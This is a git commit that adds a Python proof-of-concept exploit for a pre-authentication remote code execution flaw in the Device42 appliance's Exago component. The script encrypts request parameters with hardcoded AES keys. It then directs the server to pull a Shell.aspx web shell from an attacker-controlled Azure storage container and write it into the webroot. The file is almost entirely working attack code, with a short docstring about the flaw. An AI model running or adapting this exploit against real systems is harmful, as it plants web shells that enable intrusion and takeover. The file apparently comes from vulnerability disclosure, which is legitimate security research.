9c733abc15a7ffd7861d3d6fd5dba1b53baed459
3sjay <39624947+3sjay@users.noreply.github.com>
2023-08-11 21:31:08 +0200

    Create device42_preauth-rce_poc.py

---
+++ device42_preauth-rce_poc.py
@@ -0,0 +1,64 @@
+from Crypto.Cipher import AES
+import hashlib
+import os
+import base64
+from pypadding import iso10126
+import requests
+import urllib.parse
+
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
+"""
+https://nvd.nist.gov/vuln/detail/c mentions that this is a file disclosure as `root`. 
+While this is correct, the application implemented a functionality to retrieve cloud files from AWS and Azure
+which subsequently will be stored on the actual appliance. The problem arises from the fact that the path 
+where the file is to be stored at is also controllable, leading to a pre-auth arbitrary file write and
+therefore to pre-auth RCE directly without much luck-dependend chaining.
+
+As I can't find my actual writeup anymore, this is all info I'm publishing now.
+
+
+Anyway, congratz to the researchers from bitdefender who won the publishing race on this ;)
+
+"""
+
+def encrypt(text):
+  # define 128-bit key from a text password
+  tx_key_128 = base64.b64decode("JWZHKGqV8ITXHw3/VLyFfQ==")
+
+  # initialization vector
+  tx_iv = base64.b64decode("qe2xwnaq4onei0+CuR41nQ==") 
+
+  encoder = iso10126.Encoder(16)
+  ptxt = encoder.encode(text)
+
+  encryptor = AES.new(tx_key_128, AES.MODE_CBC, IV=tx_iv)
+  tx_ctxt = encryptor.encrypt(ptxt)
+
+  safe_string = urllib.parse.quote_plus(base64.b64encode(tx_ctxt).decode("utf-8"))
+  return safe_string
+
+
+
+# message to crypt with AES-128
+t = b'/opt/Exago/'
+t = encrypt(t)
+
+f = b"Shell.aspx"
+f = encrypt(f)
+
+
+# azure - shell.aspx we want to write to local drive to achieve RCE
+c = b"type=azure;storagekey=newcontainer/;credentials='DefaultEndpointsProtocol=https;AccountName=demotesta;AccountKey=z<snip>==;EndpointSuffix=core.windows.net';"
+
+c = encrypt(c)
+
+
+url = f"https://<ip>/Exago/WrImageResource.axd?t={t}&f={f}&c={c}"
+
+r = requests.get(url, verify=False)
+print(r.text)
+
+print("[+] Shell now available in webroot...")
